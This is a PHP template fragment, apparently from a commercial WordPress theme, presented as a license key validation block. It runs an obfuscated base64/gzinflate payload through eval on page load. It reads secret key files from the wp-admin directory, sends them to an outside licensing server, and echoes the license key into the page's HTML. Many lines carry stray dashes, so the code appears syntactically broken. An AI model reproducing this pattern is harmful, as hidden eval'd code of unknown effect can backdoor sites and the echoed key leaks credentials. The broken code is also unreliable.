<! -- GOLDFASH LICENSE KEY VALIDATION START --!>
<?php -// IF YOU DO NOT KNOW THE CREDENTIALS FOR BELOW PLEASE CALL GOLDFASH HOSTING 302 - 387 - 4653 or visit support.goldfash.com        +eval(gzinflate(base64_decode('nVLvT9swEP2OxP9wIKS0ErUphW1alU0F0h8iaiYStiGEIuNcEos0zmynUE373+cEOsrYpGn5kDh57969e5ctSmE2hqvgEs4CmAcRnM+DLxBNPTi98M68eTQb+SGMgws48XyLfPK9UWjBke/DJPDPxqNwCtMgjGbzCQwODqEHg3dv7f3ozfEApIKl0MKArqtKKkMyWSQp0znhcrG9tReeXzuhZztF/rl35dyAC6koMM7QxFyWBkujOw4h9L7qsWQhSkr6heBYaiTmwTj7YFSN3eELqX9VOvyLUuMxRF4rYVZW5pXJhpPbGUa1yV/ia9iGGuXMaJiZHQiNrMBLhBFlRmDKqmoFJ4XMMvu+s70lSl7UCYJDlgNS5ZUzBKvPKlFb7d3cmEq/p1SlIiO1pqNeEzqtitqWE20UsgXlD+SzdzEmdIIRRfKVHFNbT0WZ4EMjuds41tUt026J99Ce2i7tqffhKYf4Dlfui+k3SVYx1qiWqNzW3SamkSubc1u/TmYTx5Ld2l3INC1EiW7KCo3DZ3jJCpEwg3Ei78tCsiRmnKPWbrOSTR2FBTJrtCG7Tr9v85/LJS5uUcHhQf/I2RB9ahYbeYdlXKvCdf43zHU+T5LUeVzxpWYZ7gNLEjC50GCkfSJ8q1GtrJhdL3zk1rCKC8lZ0cQTc8ZzdFd2JpFCR2iNprMXT7zo2vkj1bnpdsGywV7f14f1iI8VLe+5rtMdrnk/4HXGDdyijw5+bUgpqXTX9kgE/v512Cq1NXbsU9u1rCv7Upet/Zb8LIs8l+C0v/FP')));
      $SK['SECRETLKEY'] = file_get_contents('../wp-admin/.GoldSYNC.txt', true);        
      $SK['SECRETKEY'] = file_get_contents('../wp-admin/.GetSyncing.txt', true);        
      $goldSecurity = $SK['SECRETLKEY'];        
      $hashAuth = $SK['SECRETKEY'];        
      -// Thats It! Stop Editing. Happy Blogging!        
      -include '.v3.php';         
      -$apiu = "https://rfig.us/A-GOLD/plugin.stream/cx.VERF./GeT/e.X.5/api/index.php";        
      -$spbas=new spbas;         
      -$spbas->license_key=$goldSecurity;         
      -$spbas->api_server=$apiu;         
      -$spbas->secret_key=$hashAuth;         
      -$spbas->enable_offline=false;        
      -$spbas->validate_download_access=true;         
      -$spbas->release_date='11th November 2014';        
      -$spbas->offline_token_url='https://rfig.us/A-GOLD/plugin.stream/cx.VERF./GeT/e.X.5/license_offline/';        
      -// Usage, add this to the querystring ?clear_local_key_cache=y         
      -if (isset($_GET['clear_local_key_cache']))          
      -    {          
      -    $spbas->clear_cache_local_key();          
      -    }         
      -$spbas->validate();         
      -           
      -if ($spbas->errors) { die($spbas->errors); }         
      -           
      -// Cleanup         
      -unset($spbas);         
      -           
      -echo ''; ?>
      <! #Visit licensesupport.goldfash.com & mention License key <?php echo $goldSecurity ?> for support !>
<! -- GOLDFASH LICENSE KEY VALIDATION END --!>
<link rel="stylesheet" type="text/css" href="<?php echo $url; ?>//<?php echo $gstyld; ?>"  />